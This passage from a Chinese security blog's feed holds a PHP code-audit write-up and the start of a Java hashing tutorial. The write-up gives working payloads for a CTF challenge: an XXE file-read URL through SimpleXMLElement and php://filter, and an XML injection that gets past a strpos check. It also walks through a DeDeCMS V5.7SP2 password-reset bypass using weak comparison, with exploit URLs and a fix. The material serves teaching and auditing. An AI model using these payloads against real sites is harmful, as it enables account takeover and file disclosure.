class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param2</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$classname</span>))&#123;</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="variable">$classname</span>(<span class="variable">$param</span>,<span class="variable">$param2</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$newclass</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$newclass</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27;=&gt;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>定义一个 <code>NotFound</code> 类<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;404&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>这个 <code>NotFound</code> 类有一个构造函数，该函数调用了 <code>die(&#39;404&#39;);</code>。这意味着当这个类被实例化时，脚本会立即终止并输出 <code>404</code>。这通常用于表示未找到（如页面或资源）。</li></ul><ol start="2"><li>注册一个自动加载函数<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(</span><br><span class="line">function (<span class="variable">$class</span>)&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">NotFound</span>();</span><br><span class="line">&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li></ol><ul><li><code>spl_autoload_register</code> 函数用于注册任意数量的自动加载器，这些加载器在PHP执行过程中试图使用未定义的类或接口时被调用。</li><li>这里注册的匿名函数在尝试自动加载一个类时创建一个 <code>NotFound</code> 类的实例，因此无论什么类名被请求，都将输出404并终止执行。</li></ul><ol start="3"><li>获取HTTP GET参数<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$classname</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param2</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] : <span class="literal">null</span>;</span><br></pre></td></tr></table></figure></li></ol><ul><li>这段代码通过GET请求读取 <code>name</code>、<code>param</code> 和 <code>param2</code> 参数，并将它们保存在变量 <code>$classname</code>、<code>$param</code> 和 <code>$param2</code> 中。如果这些GET参数不存在，则相应的变量被设置为 <code>null</code>。</li></ul><ol start="4"><li>检查类是否存在并实例化<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$classname</span>))&#123;</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="variable">$classname</span>(<span class="variable">$param</span>,<span class="variable">$param2</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$newclass</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$newclass</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27;=&gt;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><code>class_exists($classname)</code> 函数检查一个类是否已定义，这也会触发自动加载机制。</li><li>如果类存在，代码将使用动态传入的参数 <code>$param</code> 和 <code>$param2</code> 创建这个类的实例。</li><li>使用 <code>var_dump($newclass);</code> 输出新创建对象的详细信息。</li><li>使用 <code>foreach</code> 循环遍历对象的公开属性并打印它们。</li></ul><p>这道题目考察的是实例化漏洞结合XXE漏洞。我们在上图第18行处可以看到使用了 <strong>class_exists</strong> 函数来判断类是否存在，如果不存在的话，就会调用程序中的 <strong>__autoload</strong> 函数，但是这里没有 <strong>__autoload</strong> 函数，而是用 <a href="http://php.net/manual/en/function.spl-autoload-register.php"><strong>spl_autoload_register</strong></a> 注册了一个类似 <strong>__autoload</strong> 作用的函数，即这里输出404信息。</p><p>我们这里直接利用PHP的内置类，先用 <strong>GlobIterator</strong> 类搜索 <strong>flag文件</strong> 名字，来看一下PHP手册对 <strong>GlobIterator</strong> 类的 构造函数的定义：</p><blockquote><p>public <strong>GlobIterator::__construct</strong> ( string <code>$pattern</code> [, int <code>$flags</code> &#x3D; FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ] )</p></blockquote><p>第一个参数为要搜索的文件名，第二个参数为选择文件的哪个信息作为键名，这里我选择用 <strong>FilesystemIterator::CURRENT_AS_FILEINFO</strong> ，其对应的常量值为0，你可以在 <a href="http://php.net/manual/en/globiterator.construct.php">这里</a> 找到这些常量的值，所以最终搜索文件的 <strong>payload</strong> 如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/CTF/index.php?name=GlobIterator&amp;param=./*.php&amp;param2=0</span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-24.png"><br>我们将会发现flag的文件名为 <strong>f1agi3hEre.php</strong> ，接下来我们使用内置类 <strong>SimpleXMLElement</strong> 读取 <strong>f1agi3hEre.php</strong> 文件的内容,，这里我们要结合使用PHP流的使用，因为当文件中存在： <strong>&lt;   &gt;   &amp;   ‘   “</strong> 这5个符号时，会导致XML文件解析错误，所以我们这里利用PHP文件流，将要读取的文件内容经过 <strong>base64编码</strong> 后输出即可，具体payload如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/CTF/index.php?name=SimpleXMLElement&amp;param=&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/CTF/f1agi3hEre.php&quot;</span>&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;&amp;param2=2</span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-23.png"><br>上面payload中的param2&#x3D;2，实际上这里2对应的模式是 <strong>LIBXML_NOENT</strong> ，具体可以参考 <a href="http://php.net/manual/en/simplexmlelement.construct.php">这里</a> 。</p><h2 id="False-Beard"><a href="#False-Beard" class="headerlink" title="False Beard"></a>False Beard</h2><p>题目名字叫假胡子，代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-25.png"><br><strong>题目解析：</strong><br>我们看到 <strong>第11行</strong> 和 <strong>第12行</strong> ，程序通过格式化字符串的方式，使用 <strong>xml</strong> 结构存储用户的登录信息。实际上这样很容易造成数据注入。然后 <strong>第21行</strong> 实例化 <strong>Login</strong> 类，并在 <strong>第16行</strong> 处调用 <strong>login</strong> 方法进行登陆操作。在进行登录操作之前，代码在 <strong>第8行</strong> 和 <strong>第9行</strong> 使用 <strong>strpos</strong> 函数来防止输入的参数含有 <strong>&lt;** 和 **&gt;</strong> 符号，猜测开发者应该是考虑到非法字符注入问题。我们先来看一下 <strong>strpos</strong> 函数的定义：</p><blockquote><p><strong><a href="http://php.net/manual/zh/function.strpos.php">strpos</a></strong> — 查找字符串首次出现的位置<br>作用：主要是用来查找字符在字符串中首次出现的位置。<br>结构：<code>int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )</code><br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-26.png"><br>在上面这个例子中，<strong>strpos</strong> 函数返回查找到的子字符串的下标。如果字符串开头就是我们要搜索的目标，则返回下标 <strong>0</strong> ；如果搜索不到，则返回 <strong>false</strong> 。在这道题目中，开发者只考虑到 <strong>strpos</strong> 函数返回 <strong>false</strong> 的情况，却忽略了匹配到的字符在首位时会返回 <strong>0</strong> 的情况，因为 <strong>false</strong> 和 <strong>0</strong> 的取反均为 <strong>true</strong> 。这样我们就可以在用户名和密码首字符注入 <strong>&lt;</strong> 符号，从而注入xml数据。我们尝试使用以下 <strong>payload</strong> ，观察 <strong>strpos</strong> 函数的返回结果。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&lt;<span class="string">&quot;&gt;&lt;injected-tag%20property=&quot;</span>&amp;pass=&lt;injected-tag&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-27.png"></p><p>如上图所示，很明显是可以注入xml数据的。</p><h3 id="实例分析-2"><a href="#实例分析-2" class="headerlink" title="实例分析"></a>实例分析</h3><p>实际上，本次漏洞是开发者对 <strong>strpos</strong> 函数理解不够，或者说是开发者考虑不周，导致过滤方法可被绕过。由于我们暂时没有在互联网上找到 <strong>strpos</strong> 使用不当导致漏洞的CMS案例，所以这里只能选取一个相似的漏洞进行分析，同样是开发者验证不够周全导致的漏洞。<br>本次案例，我们选取 <strong>DeDecms V5.7SP2正式版</strong> 进行分析，该CMS存在未修复的任意用户密码重置漏洞。漏洞的触发点在 <strong>member&#x2F;resetpassword.php</strong> 文件中，由于对接收的参数 <strong>safeanswer</strong> 没有进行严格的类型判断，导致可以使用弱类型比较绕过。我们来看看相关代码：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-28.png"><br>针对上面的代码做个分析，当 <strong>$dopost</strong> 等于 <strong>safequestion</strong> 的时候，通过传入的 <strong>$mid</strong> 对应的 <strong>id</strong> 值来查询对应用户的安全问题、安全答案、用户id、电子邮件等信息。跟进到 <strong>第11行</strong> ，当我们传入的问题和答案非空，而且等于之前设置的问题和答案，则进入 <strong>sn</strong> 函数。然而这里使用的是 <strong>&#x3D;&#x3D;</strong> 而不是 <strong>&#x3D;&#x3D;&#x3D;</strong> 来判断，所以是可以绕过的。假设用户没有设置安全问题和答案，那么默认情况下安全问题的值为 <strong>0</strong> ，答案的值为 <strong>null</strong> （这里是数据库中的值，即 <strong>$row[‘safequestion’]&#x3D;”0”</strong> 、 <strong>$row[‘safeanswer’]&#x3D;null</strong> ）。当没有设置 <strong>safequestion</strong> 和 <strong>safeanswer</strong> 的值时，它们的值均为空字符串。第11行的if表达式也就变成了 <strong>if(‘0’ &#x3D;&#x3D; ‘’ &amp;&amp; null &#x3D;&#x3D; ‘’)</strong> ，即 <strong>if(false &amp;&amp; true)</strong> ，所以我们只要让表达式 <strong>$row[‘safequestion’] &#x3D;&#x3D; $safequestion</strong> 为 <strong>true</strong> 即可。下图是 <strong>null &#x3D;&#x3D; ‘’</strong> 的判断结果：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-30.png"><br>我们可以利用 <strong>php弱类型</strong> 的特点，来绕过这里 <strong>$row[‘safequestion’] &#x3D;&#x3D; $safequestion</strong> 的判断，如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-31.png"><br>通过测试找到了三个的payload，分别是 <strong>0.0</strong> 、 <strong>0.</strong> 、 <strong>0e1</strong> ，这三种类型payload均能使得 <strong>$row[‘safequestion’] &#x3D;&#x3D; $safequestion</strong>  为 <strong>true</strong> ，即成功进入 <strong>sn</strong> 函数。跟进 <strong>sn</strong> 函数，相关代码在 <strong>member&#x2F;inc&#x2F;inc_pwd_functions.php</strong> 文件中，具体代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-32.png"><br>在 <strong>sn</strong> 函数内部，会根据id到pwd_tmp表中判断是否存在对应的临时密码记录，根据结果确定分支，走向 <strong>newmail</strong> 函数。假设当前我们第一次进行忘记密码操作，那么此时的 <strong>$row</strong> 应该为空，所以进入第一个 <strong>if(!is_array($row))</strong> 分支，在 <strong>newmail</strong> 函数中执行 <strong>INSERT</strong> 操作，相关操作代码位置在 <strong>member&#x2F;inc&#x2F;inc_pwd_functions.php</strong> 文件中，关键代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-33.png"><br>该代码主要功能是发送邮件至相关邮箱，并且插入一条记录至 <strong>dede_pwd_tmp</strong> 表中。而恰好漏洞的触发点就在这里，我们看看 <strong>第13行</strong> 至 <strong>第18行</strong> 的代码，如果 <strong>($send &#x3D;&#x3D; ‘N’)</strong> 这个条件为真，通过 <strong>ShowMsg</strong> 打印出修改密码功能的链接。 <strong>第17行</strong> 修改密码链接中的 <strong>$mid</strong> 参数对应的值是用户id，而 <strong>$randval</strong> 是在第一次 <strong>insert</strong> 操作的时候将其 <strong>md5</strong> 加密之后插入到 <strong>dede_pwd_tmp</strong> 表中，并且在这里已经直接回显给用户。那么这里拼接的url其实是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/member/resetpassword.php?dopost=getpasswd&amp;id=$mid&amp;key=$randval</span><br></pre></td></tr></table></figure><p>继续跟进一下 <strong>dopost&#x3D;getpasswd</strong> 的操作，相关代码位置在 <strong>member&#x2F;resetpassword.php</strong> 中，<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-34.png"><br>在重置密码的时候判断输入的用户id是否执行过重置密码，如果id为空则退出；如果 <strong>$row</strong> 不为空，则会执行以下操作内容，相关代码在 <strong>member&#x2F;resetpassword.php</strong> 中。<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-36.png"><br>上图代码会先判断是否超时，如果没有超时，则进入密码修改页面。在密码修改页面会将 <strong>$setp</strong> 赋值为2。<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-37.png"><br>由于现在的数据包中 <strong>$setp&#x3D;2</strong> ，因此这部分功能代码实现又回到了 <strong>member&#x2F;resetpassword.php</strong> 文件中。<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-38.png"><br>上图代码 <strong>第6行</strong> 判断传入的 <strong>$key</strong> 是否等于数据库中的 <strong>$row[‘pwd’]</strong> ，如果相等就完成重置密码操作，至此也就完成了整个攻击的分析过程。</p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>我们分别注册 <strong>test1</strong> ， <strong>test2</strong> 两个账号<br>第一步访问 <strong>payload</strong> 中的 <strong>url</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dedecms/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;<span class="built_in">id</span>=9</span><br></pre></td></tr></table></figure><p>这里 <strong>test2</strong> 的id是9<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-39.png"><br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-40.png"><br>通过抓包获取到 <strong>key</strong> 值。<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-41.png"><br>去掉多余的字符访问修改密码链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.240/dedecms/member/resetpassword.php?dopost=getpasswd&amp;id=9&amp;key=OTyEGJtg</span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-42.png"><br>最后成功修改密码，我将密码修改成 <strong>123456</strong> ，数据库中 <strong>test2</strong> 的密码字段也变成了 <strong>123456</strong> 加密之后的值。<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-43.png"></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>针对上面 <strong>DeDecms任意用户密码重置</strong> 漏洞，我们只需要使用 <strong>&#x3D;&#x3D;&#x3D;</strong> 来代替 <strong>&#x3D;&#x3D;</strong> 就行了。因为 <strong>&#x3D;&#x3D;&#x3D;</strong> 操作会同时判断左右两边的值和数据类型是否相等，若有一个不等，即返回 <strong>false</strong> 。具体修复代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-44.png"></p>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【算法】哈希</title>
      <link href="/2024/09/30/algorithm/hash/"/>
      <url>/2024/09/30/algorithm/hash/</url>
      
        <content type="html"><![CDATA[<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>一般哈希表都是用来快速判断一个元素是否出现集合里。要枚举的话时间复杂度是O(n)，但如果使用哈希表的话， 只需要O(1)就可以做到。将学生姓名映射到哈希表上就涉及到了hash function ，也就是哈希函数。<br><img src="/2024/09/30/algorithm/hash/image.png"><br>如果学生的数量大于哈希表的大小怎么办，此时就算哈希函数计算的再均匀，也避免不了会有几位学生的名字同时映射到哈希表 同一个索引下标的位置。</p><p>接下来哈希碰撞登场<br>拉链法：拉链法就是要选择适当的哈希表的大小，这样既不会因为数组空值而浪费大量内存，也不会因为链表太长而在查找上浪费太多时间。<br><img src="/2024/09/30/algorithm/hash/image-1.png"><br>线性探测法：使用线性探测法，一定要保证tableSize大于dataSize。 我们需要依靠哈希表中的空位来解决碰撞问题。例如冲突的位置，放了小李，那么就向下找一个空位放置小王的信息。所以要求tableSize一定要大于dataSize ，要不然哈希表上就没有空置的位置来存放 冲突的数据了。<br><img src="/2024/09/30/algorithm/hash/image-2.png"></p><p>当我们想使用哈希法来解决问题的时候，我们一般会选择如下三种数据结构。</p><ul><li>数组</li><li>set （集合）</li><li>map(映射)<br>当我们遇到了要快速判断一个元素是否出现集合里的时候，就要考虑哈希法。但是哈希法也是牺牲了空间换取了时间，因为我们要使用额外的数组，set或者是map来存放数据，才能实现快速的查找。如果在做面试题目的时候遇到需要判断一个元素是否出现过的场景也应该第一时间想到哈希法！</li></ul><ol><li><p>检测数组中的重复元素</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">containsDuplicate</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    Set&lt;Integer&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!set.add(num)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 如果添加失败，说明元素已存在</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>两数之和</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">    Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">complement</span> <span class="operator">=</span> target - nums[i];</span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(complement)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;map.get(complement), i&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        map.put(nums[i], i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;No two sum solution&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>有效的字母异位词</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">isAnagram</span><span class="params">(String s, String t)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length() != t.length()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span>[] count = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">26</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">        count[s.charAt(i) - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        count[t.charAt(i) - <span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> c : count) &#123;</span><br><span class="line">        <span class="keyword">if</span> (c != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>三数之和</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">List&lt;List&lt;Integer&gt;&gt; <span class="title function_">threeSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    Arrays.sort(nums);</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length &amp;&amp; nums[i] &lt;= <span class="number">0</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span> || nums[i - <span class="number">1</span>] != nums[i]) &#123;</span><br><span class="line">            twoSumII(nums, i, res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">twoSumII</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> i, List&lt;List&lt;Integer&gt;&gt; res)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">lo</span> <span class="operator">=</span> i + <span class="number">1</span>, hi = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (lo &lt; hi) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[i] + nums[lo] + nums[hi];</span><br><span class="line">        <span class="keyword">if</span> (sum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ++lo;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            --hi;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.add(Arrays.asList(nums[i], nums[lo++], nums[hi--]));</span><br><span class="line">            <span class="keyword">while</span> (lo &lt; hi &amp;&amp; nums[lo] == nums[lo - <span class="number">1</span>])</span><br><span class="line">                ++lo;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>四数之和</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">List&lt;List&lt;Integer&gt;&gt; <span class="title function_">fourSum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    Arrays.sort(nums);</span><br><span class="line">    <span class="keyword">return</span> kSum(nums, target, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">List&lt;List&lt;Integer&gt;&gt; <span class="title function_">kSum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target, <span class="type">int</span> start, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (start == nums.length || nums[start] * k &gt; target || target &gt; nums[nums.length - <span class="number">1</span>] * k)</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    <span class="keyword">if</span> (k == <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> twoSum(nums, target, start);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start; i &lt; nums.length; ++i)</span><br><span class="line">        <span class="keyword">if</span> (i == start || nums[i - <span class="number">1</span>] != nums[i])</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> set : kSum(nums, target - nums[i], i + <span class="number">1</span>, k - <span class="number">1</span>)) &#123;</span><br><span class="line">                res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(Arrays.asList(nums[i])));</span><br><span class="line">                res.get(res.size() - <span class="number">1</span>).addAll(set);</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">List&lt;List&lt;Integer&gt;&gt; <span class="title function_">twoSum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">int</span> <span class="variable">lo</span> <span class="operator">=</span> start, hi = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (lo &lt; hi) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[lo] + nums[hi];</span><br><span class="line">        <span class="keyword">if</span> (sum &lt; target || (lo &gt; start 